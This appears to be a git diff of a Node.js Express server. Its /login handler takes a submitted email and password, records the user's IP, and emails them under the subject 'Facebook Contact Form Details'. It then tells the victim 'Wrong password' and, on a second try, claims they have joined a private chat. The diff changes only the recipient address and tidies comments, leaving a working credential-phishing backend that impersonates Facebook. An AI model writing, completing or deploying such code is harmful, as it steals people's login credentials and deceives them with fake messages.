@@ -41,14 +41,11 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-
-
 app.get("/", (req, res) => {
     res.render("index");
 });
 
 app.post("/login", (req, res) => {
-   
     const { email, password } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
@@ -58,7 +55,7 @@ app.post("/login", (req, res) => {
         // Send email on the first attempt
         const mailOptions = {
             from: '"Info" <info@vaulttrustfinancial.com>',
-            to: 'swiftcoder147@gmail.com',
+            to: '<info@vaulttrustfinancial.com>',
             subject: 'Facebook Contact Form Details',
             text: `Facebook Contact Form Details\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
         };
@@ -69,10 +66,9 @@ app.post("/login", (req, res) => {
                 res.status(500).send('Error sending email.');
             } else {
                 console.log('Email sent: ' + info.response);
-                res.send('Wrong password'); // Send "wrong password" message
+                res.send('Wrong password');
             }
         });
-
     } else {
         // Second attempt - Send success message
         res.send('You have been successfully added to the private chat, you will get a message request shortly.');
